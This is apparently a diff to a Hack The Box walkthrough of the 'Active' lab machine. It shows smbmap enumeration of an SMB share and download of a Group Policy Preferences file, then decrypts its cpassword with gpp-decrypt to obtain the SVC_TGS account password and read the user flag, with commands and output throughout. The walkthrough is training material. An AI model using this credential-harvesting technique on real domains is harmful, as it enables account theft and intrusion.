@@ -65,7 +65,7 @@
 
 // There is one directory that we have read permissions - Replication 
 
-// Lets search recursivly this directory
+// Lets search recursivly this directory with [smbmap](https://github.com/ShawnDEvans/smbmap)
 
     $ smbmap -H 10.10.10.100 -R Replication
 
@@ -87,6 +87,70 @@
       dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
       fr--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
 
-// 
+// Lets download him 
+
+    $ smbmap -H 10.10.10.100 --download 'Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml'
+-------
+
+    [+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
+    [+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
+
+    $ ls
+     10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
+
+// And see the content 
+
+    $ cat 10.10.10.100-Replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_Groups_Groups.xml 
+-------
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+    </Groups>
+
+// We can see the domain name is 'active.htb', Also, 
+
+// Every time a new [GPP](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)(Group Policy Preference) is created, an xml file will created in the SYSVOL with all GPP passwords.
+
+// After that the passwords ecrypted with Microsoft AES as cpassword. 
+
+// The encryption key have [published](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
+// We can decrypt the password with [gpp-decryot tool](https://tools.kali.org/password-attacks/gpp-decrypt)
+
+    $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+-----
+
+    GPPstillStandingStrong2k18
+
+// We got SVC_TGS password !
+
+    SVC_TGS : GPPstillStandingStrong2k18
+
+// Now we got user credentials, we can see his share files with smbmap 
+
+    $ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+------
+
+    [+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
+            Disk                                                  	Permissions	Comment
+        ----                                                  	-----------	-------
+        ADMIN$                                            	NO ACCESS	Remote Admin
+        C$                                                	NO ACCESS	Default share
+        IPC$                                              	NO ACCESS	Remote IPC
+        NETLOGON                                          	READ ONLY	Logon server share 
+        Replication                                       	READ ONLY	
+        SYSVOL                                            	READ ONLY	Logon server share 
+        Users                                             	READ ONLY	
+
+// $smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download 'Users/SVC_TGS/Desktop/user.txt'
+[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
+[+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
+┌─[r4r3@r4r3-80sm]─[~/Desktop/GitHub/HTB/Machines/Windows/Easy/Active]
+└──╼ $ls
+ 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml   10.10.10.100-Users_SVC_TGS_Desktop_user.txt  'Text File.txt'
+┌─[r4r3@r4r3-80sm]─[~/Desktop/GitHub/HTB/Machines/Windows/Easy/Active]
+└──╼ $cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt 
+86d67d8ba232bb6a254aa4d10159e983
+
+
 
 Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
